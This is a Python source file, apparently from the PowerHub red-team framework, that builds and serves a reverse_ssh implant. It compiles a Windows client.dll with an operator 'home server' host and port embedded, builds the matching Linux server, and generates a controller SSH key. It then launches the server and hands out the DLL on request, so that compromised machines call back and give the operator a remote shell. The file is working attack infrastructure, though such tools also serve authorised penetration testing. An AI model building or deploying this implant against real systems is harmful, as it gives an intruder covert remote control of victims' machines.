from collections import namedtuple
import logging
from enum import Enum, auto
import os
import shutil
import subprocess
import threading

from powerhub.directories import directories

log = logging.getLogger(__name__)

RSSH_EXT_DIR = os.path.join(directories.BASE_DIR, 'ext', 'reverse_ssh')


class HandlerState(Enum):
    OFFLINE = auto()
    BUILDING = auto()
    ONLINE = auto()


BuildCommand = namedtuple(
    "BuildCommand", "cmd env comment"
)


class ShellHandler(object):
    def __init__(self):
        self._state = HandlerState.OFFLINE
        self._thread = None
        self._thread_result = None
        self._proc = None
        self._build_lock = threading.Lock()

    @property
    def state(self):
        return self._state

    def build(self, host, port):
        log.info("Building rssh binaries...")
        if not self.check_dependencies():
            log.error("Unable to build; missing dependencies")
            return

        home_server = "%s:%d" % (host, port)
        cmd = [shutil.which('make'), '-C', RSSH_EXT_DIR]
        env = dict(
            KEY_DIR=directories.RSSH_DIR,
            BUILD_DIR=directories.RSSH_DIR,
            CC=shutil.which('x86_64-w64-mingw32-gcc'),
            GOOS='windows',
            HOME=os.environ.get("HOME", ""),
            RSSH_HOMESERVER=home_server,
            #  RSSH_PROXY=foobar:1080,
        )
        key_path = os.path.join(directories.RSSH_DIR, "controller_key")

        commands = [
            BuildCommand(
                cmd=cmd + ['server'],
                env={**env, 'GOOS': 'linux'},
                comment="Building RSSH server...",
            ),
            BuildCommand(
                cmd=cmd + ['client_dll'],
                env=env,
                comment="Building RSSH client.dll...",
            ),
            BuildCommand(
                cmd="ssh-keygen -t ed25519 -f".split() + [key_path, '-N', '', '-C', ''],
                env={},
                comment="Building RSSH client.dll...",
            ),
        ]

        thread = threading.Thread(
            target=self._build,
            args=(commands, host, port),
        )
        thread.start()

    def _build(self, commands, host, port):
        self._state = HandlerState.BUILDING
        try:
            for c in commands:
                p = subprocess.Popen(c.cmd, env=c.env, stdout=subprocess.PIPE,
                                     stderr=subprocess.PIPE, encoding='utf-8')
                log.info(c.comment)
                log.debug("Running: " + " ".join(c.cmd))
                stdout, stderr = p.communicate()

                if p.returncode:
                    raise RuntimeError("Build failed: %s" % stderr)

            # Rename the client.dll to include host and port
            os.rename(
                os.path.join(directories.RSSH_DIR, "client.dll"),
                self.normalize_filename(host, port, "client.dll"),
            )
            # Create authorized_keys
            shutil.copyfile(
                os.path.join(directories.RSSH_DIR, "controller_key.pub"),
                os.path.join(directories.RSSH_DIR, "authorized_keys"),
            )
        except Exception:
            self._state = HandlerState.OFFLINE
            raise

        self._state = HandlerState.OFFLINE
        log.info("Finished building rssh binaries successfully")

    def normalize_filename(self, host, port, name):
        if name == 'client.dll':
            result = os.path.join(directories.RSSH_DIR, '%s-%d-%s' % (host, port, name))
        else:
            result = os.path.join(directories.RSSH_DIR, name)
        return result

    def check_dependencies(self):
        """Check whether the necessary dependencies are available"""
        dependencies = [
            'make',
            'go',
            'ssh',
            'ssh-keygen',
            'x86_64-w64-mingw32-gcc',
        ]

        result = True

        for dep in dependencies:
            if not shutil.which(dep):
                result = False
                log.error("Dependency not found: %s" % dep)

        return result

    def is_ready(self, host, port):
        """Check whether the binaries have been built"""
        result = all(
            os.path.exists(self.normalize_filename(host, port, path))
            for path in [
                'client.dll',
                'server',
                'controller_key',
            ]
        )
        return result

    def run(self, host, port):
        if self.state == HandlerState.ONLINE:
            log.info("Handler already running")
            return

        if not self.is_ready(host, port):
            raise RuntimeError("Binaries not built yet")

        cmd = [
            os.path.join(directories.RSSH_DIR, 'server'),
            "%s:%d" % (host, port),
        ]

        def store_result(self, func):
            log.debug("Executing: " + " ".join(cmd))
            self._thread_result = func()
            self._state == HandlerState.OFFLINE
            if self._proc.returncode:
                log.error(
                    "RSSH Server exited with non-zero return code: "
                    + self._thread_result[1].decode()
                )
            else:
                log.info("RSSH Server exited")

        self._proc = subprocess.Popen(
            cmd,
            cwd=directories.RSSH_DIR,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
        )
        self._thread = threading.Thread(
            target=store_result,
            args=(self, self._proc.communicate,),
        )
        log.info("Launching RSSH server")
        self._thread.start()

        self._state = HandlerState.ONLINE

    def stop(self):
        if self.state != HandlerState.ONLINE:
            log.info("Handler not running")
            return

        if self._proc:
            self._proc.terminate()
            self._state = HandlerState.OFFLINE

    def get_client_dll(self, host, port):
        if self.state != HandlerState.ONLINE:
            log.error("RSSH Handler is not ready")
            return

        path = os.path.join(
            directories.RSSH_DIR,
            '%s-%d-%s' % (host, port, 'client.dll'),
        )
        result = open(path, 'rb').read()
        return result

    def request_client_dll(self, host, port):
        """Start server if necessary and return the client_dll or an error code

        This is handled here to avoid race conditions, because the build
        process is run in a separate thread.
        """

        try:
            self._build_lock.acquire()

            if self.state == HandlerState.ONLINE:
                response = self.get_client_dll(host, port)
            elif self.state == HandlerState.BUILDING:
                response = b"still_building"
            # State is OFFLINE
            elif self.is_ready(host, port):
                # Binaries built but not running yet
                self.run(host, port)
                response = self.get_client_dll(host, port)
            else:
                self.build(host, port)
                response = b"now_building"

            self._build_lock.release()
            return response
        finally:
            if self._build_lock.locked():
                self._build_lock.release()
